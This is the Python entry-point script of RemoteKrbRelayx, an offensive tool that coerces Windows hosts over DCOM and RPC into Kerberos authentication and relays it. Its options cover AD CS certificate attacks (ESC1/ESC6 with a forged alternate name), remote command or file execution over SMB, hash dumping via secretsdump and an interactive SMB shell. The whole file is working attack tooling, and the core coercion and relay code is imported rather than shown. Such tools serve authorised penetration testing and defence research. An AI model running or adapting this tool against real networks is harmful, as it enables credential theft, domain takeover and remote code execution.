#!/usr/bin/env python
#
# RemoteKrbRelayx - A tool for coercing and relaying Kerberos authentication over DCOM and RPC.
# Author: Ole Fredrik Borgundvåg Berg / Helse- og KommuneCERT (@olefredrikberg)
#
# Based on krbrelayx.py by Dirk-jan Mollema (@_dirkjan)
# and potato.py and rpcrelayserver.py by Sylvain Heiniger (@sploutchy) / Compass Security (https://compass-security.com)
#

import warnings
warnings.simplefilter("ignore")

import sys
import argparse
import logging
import time

from impacket.examples import logger, utils
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

from remotekrbrelayx.potato import Potato
from remotekrbrelayx.rpcrelayserver import RPCRelayServer
from remotekrbrelayx.config import RemoteKrbRelayxConfig

import sys
from remotekrbrelayx.krbrelayx.lib.clients import getClients


RELAY_SERVERS = (RPCRelayServer,)
PROTOCOL_CLIENTS = getClients()

def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, RELAY_SERVERS):
            thread.server.shutdown()
            todelete.append(thread)
    for thread in todelete:
        threads.remove(thread)
        del thread

def main():
    logger.init()

    parser = argparse.ArgumentParser(add_help = True, description = "RemoteKrbRelayx - A tool for coercing and relaying Kerberos authentication over DCOM and RPC. By Ole Fredrik Borgundvåg Berg / Helse- og KommuneCERT (@olefredrikberg)")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address of machine to coerce>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-lootdir', action='store', type=str, required=False, metavar='LOOTDIR', default='.', help='Loot directory in which gathered loot (like certificates or dumps) will be stored (default: current directory).')

    group = parser.add_argument_group('potato')
    group.add_argument('-clsid', action='store', metavar="CLSID", help='A DCOM CLSID (default is d99e6e74-fc88-11d0-b498-00a0c90312f3, which is CertifiedDCOM)', default='d99e6e74-fc88-11d0-b498-00a0c90312f3')
    group.add_argument('-session-id', action='store', help='Session ID to perform cross-session activation. Must most likely be used in conjunction with CredMarshal-trick, as using it will generally lead to STATUS_BAD_IMPERSONATION_LEVEL-error when relaying after Resolve0xid2 (default to nothing = SYSTEM activation)')
    group.add_argument('-coerce-to', action='store', metavar="HOSTNAME OR IP", help='The hostname or IP address to coerce the target to connect to. If not specified, the -local-ip address will be used. This is typically used when trying for cross-session activation with CredMarshal-trick or when using port-forwarding.')

    group = parser.add_argument_group('listener')
    group.add_argument('-local-ip', action='store', metavar="IP", help='The local IP address to listen on (and coerce the target to connect to if -coerce-to is not specified)', required=True)
    group.add_argument('-ipv6', action='store_true',help='Use IPv6')

    group = parser.add_argument_group('relay')
    group.add_argument('-spn', action='store', metavar="PROTOCOL/SERVER", help='SPN to use for the kerberos relaying. This SPN will be in the ResolveOxid2 response and only kerberos with this SPN will be relayed (default HOST/[relay-target])')
    group.add_argument('-authentication-type', action='store', help='The type of authentication to requested from the target in the ResolveOxid2 response. This tools only supports relaying kerberos or negotiate of kerberos variety. NTLM is only supported when using alternate relay server. (default is kerberos)', default='kerberos', choices=['negotiate', 'kerberos', 'ntlm'])
    group.add_argument('-relay-target', action='store', metavar="PROTOCOL://SERVER", help='The target to relay to, in the form of PROTOCOL://server[:port][/path]. Required if not using alternate relay server')

    group = parser.add_argument_group('alternate relay server')
    group.add_argument('-alternate-server', action='store', metavar="HOSTNAME OR IP", help='The alternate server for Resolve0xid2 to redirect to instead of using this tool\'s RPC relay server. Typically a server running ntlmrelayx.py.')
    group.add_argument('-alternate-protocol', action='store', help='The protocol to use for the alternate relay server. Required if -alternate-server is specified', choices=['smb', 'rpc'])
    group.add_argument('-alternate-rpc-port', action='store', metavar="PORT", type=int, default=135, help='The alternate server port for RPC requests (default 135)')
    group.add_argument('-alternate-smb-pipe', action='store', metavar="PIPE", default='svcctl', help='The alternate server pipe for SMB requests (default svcctl)')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "HEX_KEY", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="IP",
                       help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in '
                            'the target parameter')
    
    group = parser.add_argument_group("AD CS attack options")
    group.add_argument('-adcs', action='store_true', required=False, help='Enable AD CS relay attack')
    group.add_argument('-template', action='store', metavar="TEMPLATE", required=False, help='AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`')
    group.add_argument('-altname', action='store', metavar="ALTNAME", required=False, help='Subject Alternative Name to use when performing ESC1 or ESC6 attacks.')
    group.add_argument('-victim', action='store', metavar = 'TARGET', help='Victim username or computername$, to request the correct certificate name.')

    group = parser.add_argument_group("SMB attack options")
    group.add_argument('-no-smb2support', action="store_true", default=False, help='Disable SMB2 Support')
    group.add_argument('-e', action='store', required=False, metavar='FILE', help='File to execute on the target system. '
                                     'If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
    group.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND', help='Command to execute on '
                        'target system. If not specified, hashes will be dumped (secretsdump.py must be in the same '
                                                          'directory).')
    group.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default "%s"). ' % sys.getdefaultencoding())
    group.add_argument('-interactive', action='store_true',help='Launch an smbclient instead'
                        'of executing a command after a successful relay. This console will listen locally on a '
                        ' tcp port and can be reached with for example netcat.')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)
        
    if options.alternate_server is not None and options.alternate_protocol is None:
        parser.error('You must specify the protocol to use for the alternate relay server with -alternate-protocol')
    
    if not options.alternate_server and options.authentication_type == 'ntlm':
        parser.error('Coercing NTLM authentication is only supported with alternate relay server. Set -alternate-server or use kerberos or negotiate instead.')
    
    if not options.relay_target and not options.alternate_server:
        parser.error('You must specify a relay target with -relay-target or an alternate server with -alternate-server')

    domain, username, password, address = utils.parse_target(options.target)

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password: ")

    if options.aesKey is not None:
        options.k = True

    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()
    
    if options.coerce_to is None:
        options.coerce_to = options.local_ip

    if options.relay_target is None:
        # Add dummy relay target so I don't have to add logic to handle no relay target in the relay server
        options.relay_target = "smb://localhost"

    mode = 'RELAY'
    relayTargetProcessor = TargetsProcessor(singleTarget=options.relay_target, protocolClients=PROTOCOL_CLIENTS)
    relayTarget = relayTargetProcessor.getTarget()
    if options.spn is None:
        options.spn = f"HOST/{relayTarget.hostname}"
    options.local_port = 135

    threads = set()

    c = RemoteKrbRelayxConfig()
    c.setProtocolClients(PROTOCOL_CLIENTS)
    c.setTargets(relayTargetProcessor)
    c.setExeFile(options.e)
    c.setCommand(options.c)
    c.setAddComputerSMB(None)
    c.setAttacks(PROTOCOL_ATTACKS)
    c.setInterfaceIp(options.local_ip)
    if options.altname:
        c.setAltName(options.altname)
    c.setKrbOptions(None, options.victim)
    c.setIsADCSAttack(options.adcs)
    c.setADCSOptions(options.template)
    c.setSPN(options.spn)
    c.setListeningPort(options.local_port)
    c.setMode(mode)
    c.setLootdir(options.lootdir)
    c.setSMB2Support(not options.no_smb2support)
    c.setEncoding(codec)
    c.setAuthenticationType(options.authentication_type)
    c.setIPv6(options.ipv6)
    c.setAlternateServer(options.alternate_server)
    c.setAlternateRpcPort(options.alternate_rpc_port)
    c.setAlternateSmbPipe(options.alternate_smb_pipe)
    c.setAlternateProtocol(options.alternate_protocol)
    c.setCoerceTo(options.coerce_to)
    c.setInteractive(options.interactive) 

    s = RPCRelayServer(c)
    s.start()
    threads.add(s)   

    potato = Potato(domain, username, password, address, options)
    potato.run()

    while True:
        if s.server.attack_thread is not None and not options.interactive:
            s.server.attack_thread.join()
            break
        if all(not thread.is_alive() for thread in threads):
            break
        time.sleep(0.1)

    stop_servers(threads)
    
    sys.exit(0)

if __name__ == '__main__':
    main()